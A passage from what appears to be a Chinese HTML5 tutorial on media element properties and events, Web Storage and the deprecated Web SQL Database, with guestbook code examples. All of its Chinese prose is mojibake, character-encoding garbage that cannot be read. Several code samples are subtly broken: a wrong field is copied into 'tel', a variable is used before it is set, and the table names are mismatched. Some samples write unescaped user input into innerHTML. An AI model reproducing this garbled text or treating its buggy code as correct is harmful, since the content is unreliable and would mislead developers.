¼å¼ä¸è¢«æ”¯æŒï¼Œerrorå±žæ€§ä¸ºåªè¯»å±žæ€§ 1234567891011121314151617181920const video = document.getElementById('video element');video.addEventListener('error', function () &#123; let &#123; error &#125; = video; switch (error.code) &#123; case 1: console.log('è§†é¢‘çš„ä¸‹è½½è¿‡ç¨‹è¢«ä¸­æ­¢'); break; case 2: console.log('ç½‘ç»œå‘ç”Ÿæ•…éšœï¼Œè§†é¢‘çš„ä¸‹è½½è¿‡ç¨‹è¢«ä¸­æ­¢'); break; case 3: console.log('è§£ç å¤±è´¥'); break; case 4: console.log('ä¸æ”¯æŒçš„æ’­æ”¾æ ¼å¼'); break; default: console.log('æ— '); &#125;&#125;, false); networkState,4ä¸ªå¯èƒ½å€¼ NETWORK_EMPTY(æ•°å­—å€¼ä¸º0)ï¼šéŸ³é¢‘/è§†é¢‘å°šæœªåˆå§‹åŒ– NETWORK_IDLE(1)ï¼šéŸ³é¢‘/è§†é¢‘æ˜¯æ´»åŠ¨çš„ä¸”å·²é€‰å–èµ„æºï¼Œä½†å¹¶æœªä½¿ç”¨ç½‘ç»œ NETWORK_LOADING(2)ï¼šæµè§ˆå™¨æ­£åœ¨ä¸‹è½½æ•°æ® NETWORK_NO_SOURCE(3)ï¼šæœªæ‰¾åˆ°éŸ³é¢‘/è§†é¢‘æ¥æº 12345678video.addEventListener('progress', function (e) &#123; const &#123; networkState &#125; = video; if (networkState === 2) &#123; x.innerHTML = `åŠ è½½ä¸­...[$&#123;e.loaded&#125;/$&#123;e.total&#125; byte]` &#125; else if (networkState === 3) &#123; x.innerHTML = 'è®°è½½å¤±è´¥' &#125;&#125;, false); currentSrc è¯»å–æ’­æ”¾ä¸­çš„åª’ä½“æ•°æ®çš„ URLåœ°å€ï¼Œä¸ºåªè¯»å±žæ€§ bufferedï¼ˆåªè¯»ï¼‰ buffered å±žæ€§è¿”å›ž TimeRanges å¯¹è±¡ã€‚è¯¥å¯¹è±¡è¡¨ç¤ºç”¨æˆ·çš„éŸ³è§†é¢‘ç¼“å†²èŒƒå›´ï¼Œç¼“å†²èŒƒå›´æŒ‡çš„æ˜¯å·²ç¼“å†²éŸ³è§†é¢‘çš„æ—¶é—´èŒƒå›´ã€‚å¦‚æžœç”¨æˆ·åœ¨éŸ³é¢‘ä¸­è·³è·ƒæ’­æ”¾ï¼Œä¼šå¾—åˆ°å¤šä¸ªç¼“å†²èŒƒå›´ã€‚ è¯­æ³• 1audio|video.buffered è¿”å›žå€¼ å€¼ æè¿° TimeRanges å¯¹è±¡ è¡¨ç¤ºéŸ³è§†é¢‘çš„å·²ç¼“å†²éƒ¨åˆ†ã€‚TimeRanges å¯¹è±¡å±žæ€§ï¼šlength - èŽ·å¾—éŸ³è§†é¢‘ä¸­å·²ç¼“å†²èŒƒå›´çš„æ•°é‡start(index) - èŽ·å¾—æŸä¸ªå·²ç¼“å†²èŒƒå›´çš„å¼€å§‹ä½ç½®end(index) - èŽ·å¾—æŸä¸ªå·²ç¼“å†²èŒƒå›´çš„ç»“æŸä½ç½®æ³¨é‡Šï¼šé¦–ä¸ªç¼“å†²èŒƒå›´çš„ä¸‹è¡¨æ˜¯ 0ã€‚ readyStateï¼ˆåªè¯»ï¼‰ è¿”å›žåª’ä½“å½“å‰çš„æ’­æ”¾ä½ç½®çš„å°±ç»ªçŠ¶æ€å€¼ï¼š HAVE_NOTHING(0)ï¼šæ²¡æœ‰èŽ·å–åˆ°åª’ä½“çš„ä»»ä½•ä¿¡æ¯ï¼Œå½“å‰çš„æ’­æ”¾ä½ç½®æ²¡æœ‰å¯æ’­æ”¾æ•°æ® HAVE_METADATA(1)ï¼šå·²ç»èŽ·å–åˆ°è¶³å¤Ÿçš„åª’ä½“æ•°æ®ï¼Œä½†æ˜¯å½“å‰æ’­æ”¾ä½ç½®æ²¡æœ‰æœ‰æ•ˆçš„åª’ä½“æ•°æ®ï¼ˆèŽ·å–åˆ°çš„åª’ä½“æ•°æ®æ— æ•ˆï¼‰ HAVE_CURRENT_DATA(2)ï¼šå½“å‰æ’­æ”¾ä½ç½®å·²ç»æœ‰æ•°æ®å¯ä»¥æ’­æ”¾ï¼Œä½†æ²¡æœ‰èŽ·å–åˆ°å¯ä»¥è®©æ’­æ”¾å™¨å‰è¿›çš„æ•°æ®ã€‚å½“åª’ä½“ä¸ºè§†é¢‘ï¼Œå³å½“å‰å¸§çš„æ•°æ®å·²ç»èŽ·å¾—ï¼Œä¹ŸèŽ·å¾—äº†ä¸‹ä¸€å¸§å¤§æ•°æ®ï¼Œæˆ–è€…å½“å‰å¸§å·²ç»æ˜¯æœ€åŽä¸€å¸§ HAVE_FUTURE_DATA(3)ï¼šå½“å‰æ’­æ”¾ä½ç½®å·²ç»æœ‰æ•°æ®å¯ä»¥æ’­æ”¾ï¼Œè€Œä¸”ä¹ŸèŽ·å¾—åˆ°äº†å¯ä»¥è®©æ’­æ”¾å™¨å‰è¿›çš„æ•°æ®ã€‚å½“åª’ä½“ä¸ºè§†é¢‘æ—¶ï¼Œå³å½“å‰å¸§çš„æ•°æ®å·²ç»èŽ·å¾—ï¼Œè€Œä¸”ä¹ŸèŽ·å¾—äº†ä¸‹ä¸€å¸§çš„æ•°æ®ï¼Œå½“å‰å¸§æ˜¯æ’­æ”¾çš„æœ€åŽä¸€å¸§æ—¶ï¼ŒreadyState å±žæ€§ä¸å¯èƒ½ä¸º HAVE_FUTURE_DATA HAVE_ENOUGH_DATA(4)ï¼šå½“å‰æ’­æ”¾ä½ç½®å·²ç»æœ‰æ•°æ®å¯ä»¥æ’­æ”¾ï¼ŒåŒæ—¶ä¹ŸèŽ·å¾—äº†å¯ä»¥è®©æ’­æ”¾å™¨å‰è¿›çš„æ•°æ®ï¼Œè€Œä¸”æµè§ˆå™¨ç¡®è®¤åª’ä½“æ•°æ®ä»¥æŸä¸€ç§é€Ÿåº¦å¯ä»¥åŠ è½½ï¼Œå¯ä»¥ä¿è¯æœ‰è¶³å¤Ÿçš„åŽç»­æ•°æ®è¿›è¡Œæ’­æ”¾ã€‚ seekingå±žæ€§ä¸Žseekableï¼ˆåªè¯»ï¼‰ seekingå±žæ€§è¿”å›žä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ­£åœ¨è¯·æ±‚æŸä¸€ç‰¹å®šæ’­æ”¾ä¸ºå­©å­çš„æ•°æ®ï¼Œtrueè¡¨ç¤ºæµè§ˆå™¨æ­£åœ¨è¯·æ±‚æ•°æ®ï¼Œfalseè¡¨ç¤ºæµè§ˆå™¨æ­£åœ¨åœæ­¢è¯·æ±‚ã€‚ seekableè¿”å›žä¸€ä¸ª TimeRangeså¯¹è±¡ï¼Œè¯¥å¯¹è±¡è¡¨ç¤ºè¯·æ±‚åˆ°çš„æ•°æ®çš„æ—¶é—´èŒƒå›´ã€‚å½“åª’ä½“ä¸ºè§†é¢‘æ—¶ï¼Œå¼€å§‹æ—¶é—´ä¸ºè¯·æ±‚åˆ°è§†é¢‘æ•°æ®ç¬¬ä¸€å¸§çš„æ—¶é—´ç»“æŸä¸ºè¯·æ±‚åˆ°è§†é¢‘æ•°æ®æœ€åŽä¸€å¸§çš„æ—¶é—´ã€‚ currentTimeï¼ˆå¯è¯»å†™ï¼‰/startTimeï¼ˆåªè¯»ï¼‰/durationï¼ˆåªè¯»ï¼‰ currentTimeèŽ·å–å½“å‰æ’­æ”¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹currentTimeæ¥ä¿®æ”¹å½“å‰æ’­æ”¾ä½ç½®ã€‚å¦‚æžœä¿®æ”¹çš„ä½ç½®ä¸Šæ²¡æœ‰å¯ç”¨çš„åª’ä½“æ•°æ®æ—¶ï¼Œå°†æŠ›å‡º INVALID_STATE_ERR å¼‚å¸¸ã€‚å¦‚æžœä¿®æ”¹çš„ä½ç½®è¶…å‡ºäº†æµè§ˆå™¨åœ¨ä¸€æ¬¡è¯·æ±‚ä¸­å¯ä»¥è¯·æ±‚çš„æ•°æ®èŒƒå›´ï¼Œå°†æŠ›å‡º INDEX_SIZE_ERR å¼‚å¸¸ã€‚ startTime æ¥è¯»å–åª’ä½“æ’­æ”¾çš„å¼€å§‹æ—¶é—´ï¼Œé€šå¸¸ä¸º0 duration è¯»å–åª’ä½“æ–‡ä»¶æ€»çš„æ’­æ”¾æ—¶é—´ ä¸‰è€…å•ä½å‡ä¸ºç§’ played/paused/endedï¼ˆå‡ä¸ºåªè¯»ï¼‰ played è¿”å›žä¸€ä¸ª TimeRanges å¯¹è±¡ï¼Œä»Žè¯¥å¯¹è±¡ä¸­å¯ä»¥åŽ»è¯»åª’ä½“æ–‡ä»¶çš„ä»¥æ’­æ”¾éƒ¨åˆ†çš„æ—¶é—´æ®µã€‚å¼€å§‹æ—¶é—´ä¸ºå·²æ’­æ”¾éƒ¨åˆ†çš„å¼€å§‹æ—¶é—´ï¼Œç»“æŸæ—¶é—´ä¸ºå·²æ’­æ”¾éƒ¨åˆ†çš„ç»“æŸæ—¶é—´ã€‚ paused è¿”å›žä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å¤„äºŽæš‚åœæ’­æ”¾ä¸­ï¼Œtrue è¡¨ç¤ºåª’ä½“æš‚åœæ’­æ”¾ï¼Œfalse è¡¨ç¤ºåª’ä½“æ­£åœ¨æ’­æ”¾ end è¿”å›žä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æ’­æ”¾å®Œæ¯•ï¼Œtrueè¡¨ç¤ºæ’­æ”¾å®Œæ¯•ï¼Œfalseè¡¨ç¤ºè¿˜æ²¡æœ‰æ’­æ”¾å®Œæ¯• defaultPlaybackRate/playbackRate å‰è€…è¯»å–æˆ–è€…ä¿®æ”¹é»˜è®¤çš„æ’­æ”¾é€ŸçŽ‡ï¼ŒåŽè€…å¯ä»¥è¯»å–ä¿®æ”¹å½“å‰çš„æ’­æ”¾é€ŸçŽ‡ volumeä¸Ž muted Volume è¯»å–æˆ–è€…ä¿®æ”¹åª’ä½“çš„æ’­æ”¾éŸ³é‡ï¼ŒèŒƒå›´ä¸º0åˆ°1ã€‚0ä¸ºé™éŸ³ï¼Œ1ä¸ºæœ€å¤§éŸ³é‡ mutedè¯»å–æˆ–è€…ä¿®æ”¹åª’ä½“çš„é™éŸ³çŠ¶æ€ï¼Œå¸ƒå°”å€¼ã€‚trueè¡¨ç¤ºé™éŸ³çŠ¶æ€ï¼Œfalseè¡¨ç¤ºéžé™éŸ³çŠ¶æ€ æ–¹æ³•videoä¸Ž audioéƒ½æœ‰ä»¥ä¸‹å››ç§æ–¹æ³•ï¼š playã€‚æ’­æ”¾åª’ä½“ï¼Œå°† pausedå˜ä¸º false pauseã€‚æš‚åœåª’ä½“ï¼Œå°† paused å˜ä¸º true loadã€‚é‡æ–°è½½å…¥åª’ä½“è¿›è¡Œæ’­æ”¾ï¼Œå°† playbackRateå˜ä¸º defaultPlaybackRateï¼Œerrorå˜ä¸º null canPlayTypeã€‚æ¥æµ‹è¯•æµè§ˆå™¨æ˜¯å¦æ”¯æŒæŒ‡å®šçš„åª’ä½“ç±»åž‹ã€‚support = videoElement.canPlayType(type)ã€‚è¯¥æ–¹æ³•ä½¿ç”¨ä¸€ä¸ªå‚æ•°typeï¼Œè¯¥å‚æ•°çš„æŒ‡å®šæ–¹æ³•ä¸Ž sourceå…ƒç´ çš„typeå‚æ•°çš„æŒ‡å®šæ–¹æ³•ç›¸åŒï¼Œéƒ½ç”¨æ’­æ”¾æ–‡ä»¶çš„ MIME ç±»åž‹æ¥æŒ‡å®šï¼Œå¯ä»¥åœ¨æŒ‡å®šçš„å­—ç¬¦ä¸²ä¸­åŠ ä¸Šè¡¨ç¤ºåª’ä½“ç¼–ç æ ¼å¼çš„ codeså‚æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ž3ä¸ªå¯èƒ½å€¼ï¼š ç©ºå­—ç¬¦ä¸²ï¼šè¡¨ç¤ºæµè§ˆå™¨ä¸æ”¯æŒæ­¤ç§åª’ä½“ç±»åž‹ maybeï¼šè¡¨ç¤ºæµè§ˆå™¨å¯èƒ½æ”¯æŒæ­¤ç§åª’ä½“ç±»åž‹ probablyï¼šè¡¨ç¤ºæµè§ˆå™¨ç¡®å®šæ”¯æŒæ­¤ç§åª’ä½“ç±»åž‹ äº‹ä»¶äº‹ä»¶å¤„ç†æ–¹å¼åˆ†ä¸ºä¸¤ç§ï¼š addEventListener èŽ·å–äº‹ä»¶å¥æŸ„çš„æ–¹å¼ äº‹ä»¶ æè¿° loadstart æµè§ˆå™¨å¼€å§‹åœ¨ç½‘ä¸Šå¯»æ‰¾åª’ä½“æ•°æ® progress æµè§ˆå™¨æ­£åœ¨èŽ·å–åª’ä½“æ•°æ® suspend æµè§ˆå™¨æš‚åœèŽ·å–åª’ä½“æ•°æ®ï¼Œä½†æ˜¯ä¸‹è½½è¿‡ç¨‹å¹¶æ²¡æœ‰æ­£å¸¸ç»“æŸ abort æµè§ˆå™¨åœ¨ä¸‹è½½å®Œå…¨éƒ¨åª’ä½“æ•°æ®ä¹‹å‰ä¸­æ­¢èŽ·å–åª’ä½“æ•°æ®ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ç”±é”™è¯¯å¼•èµ·çš„ error èŽ·å–åª’ä½“æ•°æ®è¿‡ç¨‹ä¸­å‡ºé”™ emptied videoå…ƒç´ æˆ–è€… audioå…ƒç´ æ‰€åœ¨ç½‘ç»œçªç„¶å˜ä¸ºæœªåˆå§‹çŠ¶æ€ã€‚å¯èƒ½å¼•èµ·çš„åŽŸå› æœ‰ä¸¤ä¸ªï¼šè½½å…¥åª’ä½“è¿‡ç¨‹ä¸­çªç„¶å‘ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯å’Œåœ¨æµè§ˆå™¨æ­£åœ¨é€‰æ‹©æ”¯æŒçš„æ’­æ”¾æ ¼å¼æ—¶ï¼Œåˆè°ƒç”¨äº† load æ–¹æ³•é‡æ–°è½½å…¥åª’ä½“ stalled æµè§ˆå™¨å°è¯•èŽ·å–åª’ä½“æ•°æ®å¤±è´¥ play å³ä½¿å¼€å§‹æ’­æ”¾ï¼Œå½“æ‰§è¡Œäº† play æ–¹æ³•æ—¶è§¦å‘ï¼Œæˆ–è€…æ•°æ®ä¸‹è½½å®Œä¹‹åŽå…ƒç´ è¢«è° autoplay pause æ’­æ”¾æš‚åœï¼Œå½“æ‰§è¡Œäº† pause æ–¹æ³•æ—¶è§¦å‘ loadedmetadata æµè§ˆå™¨èŽ·å–å®Œæ¯•åª’ä½“çš„æ—¶é•¿å¥½å­—èŠ‚æ•° loadeddata æµè§ˆå™¨å·²ç»åŠ è½½å®Œæ¯•å½“å‰æ’­æ”¾ä½ç½®çš„åª’ä½“æ•°æ®ï¼Œå‡†å¤‡æ’­æ”¾ waiting æ’­æ”¾è¿‡ç¨‹ç”±äºŽå¾—ä¸åˆ°ä¸‹ä¸€å¸§è€Œæš‚åœæ’­æ”¾ï¼ˆä¾‹å¦‚ä¸‹ä¸€å¸§å°šæœªåŠ è½½å®Œæ¯•ï¼‰ï¼Œä½†å¾ˆå¿«å°±èƒ½å¤Ÿæ’­æ”¾ä¸‹ä¸€å¸§ playing æ­£åœ¨æ’­æ”¾ canplay æµè§ˆå™¨èƒ½å¤Ÿæ’­æ”¾åª’ä½“ï¼Œä½†ä¼°è®¡ä»¥å‰æ’­æ”¾é€ŸçŽ‡ä¸èƒ½ç›´æŽ¥å°†åª’ä½“æ’­æ”¾å®Œæ¯•ï¼Œæ’­æ”¾éœ€è¦ç¼“å†² canplaythrough æµè§ˆå™¨èƒ½å¤Ÿæ’­æ”¾åª’ä½“ï¼Œè€Œä¸”ä»¥å½“å‰æ’­æ”¾é€ŸçŽ‡èƒ½å¤Ÿå°†åª’ä½“æ’­æ”¾å®Œæ¯•ï¼Œä¸å†éœ€è¦è¿›è¡Œç¼“å†² seeking seekingå±žæ€§å˜ä¸º trueï¼Œæµè§ˆå™¨æ­£åœ¨è¯·æ±‚æ•°æ® seeked seekingå±žæ€§å˜æˆfalseï¼Œæµè§ˆå™¨åœæ­¢è¯·æ±‚æ•°æ® timeupdate å½“å‰æ’­æ”¾ä½ç½®è¢«æ”¹å˜ï¼Œå¯èƒ½æ˜¯æ’­æ”¾è¿‡ç¨‹ä¸­çš„è‡ªç„¶æ”¹å˜ï¼Œä¹Ÿå¯èƒ½æ˜¯äººä¸ºåœ°æ”¹å˜ï¼Œæˆ–ç”±äºŽæ’­æ”¾ä¸èƒ½è¿žç»­è€Œå‘ç”Ÿçš„è·³å˜ ended æ’­æ”¾ç»“æŸåŽåœæ­¢æ’­æ”¾ ratechange defaultplaybackRateå±žæ€§ï¼ˆé»˜è®¤æ’­æ”¾é€ŸçŽ‡ï¼‰æˆ– playbackRateå±žæ€§ï¼ˆå½“å‰æ’­æ”¾é€ŸçŽ‡ï¼‰è¢«æ”¹å˜ durationchange æ’­æ”¾æ—¶é•¿è¢«æ”¹å˜ volumechange volumeï¼ˆéŸ³é‡ï¼‰è¢«æ”¹å˜æˆ–è€… mutedï¼ˆé™éŸ³çŠ¶æ€ï¼‰ è¢«æ”¹å˜ äº‹ä»¶æ•æ‰ç¤ºä¾‹1234video.addEventListener('timeupdate', function () &#123; const timer = document.getElementById('time'); timer.innerHTML = Math.floor(video.currentTime) + '/' + Math.floor(video.duration) + '(ç§’)';&#125;, false); æœ¬åœ°å­˜å‚¨Web Storageæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ cookies åœ¨å®¢æˆ·ç«¯ä¿å­˜æ³¨å…¥ç”¨æˆ·ç­‰ç®€å•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†å®ƒæœ‰ä¸€äº›é™åˆ¶ï¼š å¤§å°ï¼šcookieså¤§å°è¢«é™åˆ¶åœ¨ 4KB å¸¦å®½ï¼šcookies éš HTTP äº‹åŠ¡ä¸€èµ·è¢«å‘é€ï¼Œä¼šæµªè´¹ä¸€éƒ¨åˆ†å‘é€ cookiesä½¿ç”¨çš„å¸¦å®½ å¤æ‚åº¦ åœ¨ HTML5ä¸­é‡æ–°æä¾›äº†ä¸€ç§åœ¨å®¢æˆ·ç«¯æœ¬åœ°ä¿å­˜æ•°æ®çš„åŠŸèƒ½ï¼Œå°±æ˜¯ Web Storage åŠŸèƒ½ã€‚å®ƒåˆ†ä¸ºä¸¤ç§ sessionStorage å°†æ•°æ®ä¿å­˜åœ¨ seesionå¯¹è±¡ä¸­ã€‚æ‰€è°“çš„ sessionï¼Œæ˜¯æŒ‡ç”¨æˆ·åœ¨æµè§ˆæŸä¸ªç½‘ç«™çš„æ—¶å€™ï¼Œä»Žè¿›å…¥ç½‘ç«™åˆ°æµè§ˆå™¨å…³é—­æ‰€ç»è¿‡è¿™æ®µæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æµè§ˆå™¨è¿™ä¸ªç½‘ç«™æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œsession å¯¹è±¡å¯ä»¥ç”¨æ¥ä¿å­˜è¿™æ—¶é—´æ‰€è¦æ±‚ä¿å­˜çš„ä»»ä½•æ•°æ®ã€ localStorage å°†æ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯æœ¬åœ°çš„ç¡¬ä»¶è®¾å¤‡ï¼ˆé€šå¸¸å€¼ç¡¬ç›˜ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç¡¬ä»¶è®¾å¤‡ï¼‰ä¸­ï¼Œå³ä½¿æµè§ˆå™¨è¢«å…³é—­äº†ï¼Œè¯¥æ•°æ®ä»ç„¶å­˜åœ¨ï¼Œä¸‹æ¬¡æ‰“å¼€æµè§ˆå™¨è®¿é—®ç½‘ç«™ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚ 123456789101112131415// sessionStorage// ä¿å­˜æ•°æ®sessionStorage.setItem(key,value);//è¯»å–æ•°æ®å˜é‡ = seesionStorage.getItem(key)// localStorage// ä¿å­˜æ•°æ®localStorage.setItem(key,value);// ä¿å­˜æ•°æ®å˜é‡ = localStorage.getItem(key)// ä¿å­˜æ—¶ä¸å…è®¸é‡å¤é”®åã€‚ä¿å­˜åŽå¯ä»¥ä¿®æ”¹é”®å€¼ï¼Œä½†æ˜¯ä¸å…è®¸ä¿®æ”¹é”®åï¼ˆåªèƒ½é‡æ–°å–é”®åï¼Œç„¶åŽä¿å­˜é”®å€¼ï¼‰ ç¤ºä¾‹ï¼šç®€å• web ç•™è¨€æœ¬1234567891011121314151617181920212223242526272829303132333435363738&lt;body&gt; &lt;h1&gt;ç®€å• Web ç•™è¨€æœ¬&lt;/h1&gt; &lt;textarea name="memo" id="memo" cols="60" rows="10"&gt;&lt;/textarea&gt; &lt;input type="button" value="è¿½åŠ " onclick="saveStorage('memo')"&gt; &lt;input type="button" value="åˆå§‹åŒ–" onclick="clearStorage('msg')"&gt; &lt;hr&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; function saveStorage(id) &#123; const data = document.getElementById(id).value; const time = new Date().getTime(); localStorage.setItem(time, data); console.log('æ•°æ®å·²ç»ä¿å­˜äº†'); loadStorage('msg'); &#125; function loadStorage(id) &#123; let result = `&lt;table border="1"&gt;`; for (let i = 0; i &lt; localStorage.length; i++) &#123; let key = localStorage.key(i); let value = localStorage.getItem(key); let date = new Date(); date.setTime(key); let datestr = date.toGMTString(); result += `&lt;tr&gt;&lt;td&gt;$&#123;value&#125;&lt;/td&gt;&lt;td&gt;$&#123;datestr&#125;&lt;/td&gt;&lt;/tr&gt;` &#125; result += `&lt;/table&gt;`; let target = document.getElementById(id); target.innerHTML = result; &#125;; function clearStorage() &#123; localStorage.clear(); console.log('å…¨éƒ¨æ•°æ®è¢«æ¸…é™¤'); loadStorage('msg'); &#125;&lt;/script&gt; ç¤ºä¾‹ï¼šç®€æ˜“æ•°æ®åº“12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;body&gt; &lt;h1&gt;ç®€æ˜“æ•°æ®åº“&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;å§“åï¼š&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="name"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;EMAIL:&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="email"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;ç”µè¯å·ç :&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="tel"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;å¤‡æ³¨:&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="memo"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input type="button" onclick="saveStorage()" value="ä¿å­˜"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;p&gt;æ£€ç´¢ï¼š &lt;input type="text" id="find"&gt; &lt;input type="button" value="æ£€ç´¢" onclick="findStorage('msg')"&gt; &lt;/p&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; function saveStorage() &#123; let data = new Object; data.name = document.getElementById('name').value; data.email = document.getElementById('email').value; data.tel = document.getElementById('name').value; data.memo = document.getElementById('memo').value; let str = JSON.stringify(data); localStorage.setItem(data.name, str); console.log('æ•°æ®å·²ç»ä¿å­˜äº†'); &#125; function findStorage(id) &#123; let find = document.getElementById('find').value; let str = localStorage.getItem(find); let data = JSON.parse(str); let result = `å§“åï¼š $&#123;data.name&#125;&lt;br&gt;`; result += `EMAILï¼š $&#123;data.email&#125;&lt;br&gt;`; result += `ç”µè¯å·ç ï¼š $&#123;data.tel&#125;&lt;br&gt;`; result += `å¤‡æ³¨ï¼š $&#123;data.memo&#125;&lt;br&gt;`; let target = document.getElementById(id); target.innerHTML = result; &#125;&lt;/script&gt; æœ¬åœ°æ•°æ®åº“(æ–°çš„æŽ¨èIndexedDBå®žçŽ°)HTML5ä¸­å†…ç½®äº†ä¸€ä¸ªå¯ä»¥é€šè¿‡ SQL è¯­è¨€æ¥è®¿é—®çš„æ•°æ®åº“ 1let db = openDatabase('mydb','1.0','Test DB',2*1024*1024) openDatabaseæŽ¥æ”¶äº”ä¸ªå‚æ•°ï¼š æ•°æ®åº“åå­— æ•°æ®åº“ç‰ˆæœ¬å· æ˜¾ç¤ºåå­— æ•°æ®åº“ä¿å­˜æ•°æ®çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ ) å›žè°ƒå‡½æ•°ï¼ˆéžå¿…é¡») transaction æ–¹æ³•æ¥æ‰§è¡Œäº‹åŠ¡å¤„ç†ï¼Œé˜²æ­¢åœ¨å¯¹æ•°æ®åº“è¿›è¡Œè®¿é—®ä»¥åŠæœ‰å…³æ“ä½œçš„æ—¶å€™æ”¶åˆ°å¤–ç•Œçš„å¹²æ‰°ã€‚å½“ä¸€æ¡è¯­æ³•æ‰§è¡Œå¤±è´¥çš„æ—¶å€™ï¼Œæ•´ä¸ªäº‹åŠ¡ä¼šå›žæ»š 1234db.transaction(function(context)&#123; context.executeSql('CREATE TABLE IF NOT EXISTS tesTable (id unique,name)'); context.executeSql('INSERT INTO testTable(id,name) VALUES (0,"haha")')&#125;) executeSql æ–¹æ³• 1transaction.executeSql(sqlquery,[],dataHandler,errorHandler); executeSql æŽ¥æ”¶å››ä¸ªå‚æ•°ï¼š æŸ¥è¯¢å­—ç¬¦ä¸² ç”¨ä»¥æ›¿æ¢æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­é—®å·çš„å‚æ•° æ‰§è¡ŒæˆåŠŸå›žè°ƒå‡½æ•°ï¼ˆå¯é€‰ï¼‰ æ‰§è¡Œå¤±è´¥å›žè°ƒå‡½æ•°ï¼ˆå¯é€‰ï¼‰ 1transaction.executeSql("UPDATE people set age=?where name=?;",[age,name],(transaction,result)=&gt;&#123;&#125;,(transaction,errmsg)=&gt;&#123;&#125;) å®žä¾‹ï¼šç•™è¨€æœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;body onload="init()"&gt; &lt;h1&gt;ä½¿ç”¨æ•°æ®åº“å®žçŽ°çš„ Web ç•™è¨€æœ¬&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;å§“åï¼š&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="name"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;ç•™è¨€ï¼š&lt;/td&gt; &lt;td&gt;&lt;input type="text" id="memo"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input type="button" value="ä¿å­˜" onclick="saveData()"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;table id="datatable" border="1"&gt;&lt;/table&gt; &lt;p id="msg"&gt;&lt;/p&gt;&lt;/body&gt;&lt;script&gt; let datatable = null; let db = openDatabase('MyData', '', 'My Database', 102400); function init() &#123; console.log(datatable.childNodes); datatable = document.getElementById('datatable'); showAllData(); &#125; function removeAllData() &#123; for (let i = datatable.childNodes.length - 1; i &gt;= 0; i--) &#123; datatable.removeChild(datatable.childNodes[i]); &#125; let tr = document.createElement('tr'); let th1 = document.createElement('th'); let th2 = document.createElement('th'); let th3 = document.createElement('th'); th1.innerHTML = 'å§“å'; th2.innerHTML = 'ç•™è¨€'; th3.innerHTML = 'æ—¶é—´'; tr.appendChild(th1); tr.appendChild(th2); tr.appendChild(th3); datatable.appendChild(tr); &#125; function showData(row) &#123; let tr = document.createElement('tr'); let td1 = document.createElement('td'); td1.innerHTML = row.name; let td2 = document.createElement('td'); td2.innerHTML = row.message; let td3 = document.createElement('td'); let t = new Date(); t.setTime(row.time); td3.innerHTML = t.toLocaleDateString() + " " + t.toLocaleTimeString(); tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3); datatable.appendChild(tr); &#125; function showAllData() &#123; db.transaction(function (tx) &#123; tx.executeSql('CREATE TABLE IF NOT EXISTS MsgData(name TEXT,message TEXT,time INTEGER)', []); tx.executeSql('SELECT * FROM MsgData', [], function (tx, rs) &#123; removeAllData(); for (let i = 0; i &lt; rs.rows.length; i++) &#123; showData(rs.rows.item(i)); &#125; &#125;) &#125;); &#125; function addData(name, message, time) &#123; db.transaction(function (tx) &#123; tx.executeSql('INSERT INTO MsgData VALUES(?,?,?)', [name, message, time], function (tx, rs) &#123; console.log('æˆåŠŸä¿å­˜æ•°æ®'); &#125;, function (tx, error) &#123; console.log(`$&#123;error.source&#125;:$&#123;error.message&#125;`); &#125;) &#125;) &#125; function saveData() &#123; let name = document.getElementById('name').value; let memo = document.getElementById('memo').value; let time = new Date().getTime(); addData(name, memo, time); showAllData(); &#125;&lt;/script&gt; ä¸è¿‡ï¼ŒWeb SQL Databaseè§„èŒƒå·²ç»è¢«åºŸå¼ƒã€‚å› ä¸ºæ¯ä¸ªæµè§ˆå™¨éƒ½æœ‰è‡ªå·±çš„å®žçŽ°ï¼Œæµè§ˆå™¨çš„å…¼å®¹æ€§å°±ä¸é‡è¦äº†ã€‚ å…³äºŽ IndexedDB ç¦»çº¿åº”ç”¨ç¨‹åºï¼ˆå·²åºŸå¼ƒï¼‰HTML5 